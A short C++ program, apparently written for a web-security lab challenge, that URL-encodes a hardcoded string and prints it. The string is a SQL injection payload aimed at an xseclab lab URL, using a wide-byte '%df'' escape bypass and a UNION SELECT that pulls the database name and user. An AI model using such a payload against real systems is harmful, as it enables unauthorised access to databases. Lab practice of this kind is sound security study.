/*************************************************************************
	> File Name: paser.cpp
	> Author: DevilBin 
	> Mail: whu.evil.binary@gmail.com 
	> Created Time: 2016/4/10 14:37:15
 ************************************************************************/

#include <iostream>
#include <iomanip>
#include <fstream>
#include <cstdlib>
#include <string>
#include <vector>
#include <deque>
#include <list>
#include <map>
#include <algorithm>
#include <sstream>
#include <climits>

using namespace std;

int main() {
    string temp;
    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df' union select 4,database(),user()#";
    unsigned index = 0;
    while(index < s.size()) {
        switch(s[index]) {
            case '%': {
                temp += s[index];
                temp += s[index + 1];
                temp += s[index + 2];
                index += 3;
            }; break;
            case ' ': {
                temp += "%20";
                ++index;
            }; break;
            case '(': {
                temp += "%28";
                ++index;
            }; break;
            case ')': {
                temp += "%29";
                ++index;
            }; break;
            case '#': {
                temp += "%23";
                ++index;
            }; break;
            default: {
                temp += s[index];
                ++index;
            }; break;
        }
    }
    cout << temp << endl;
    return 0;
}
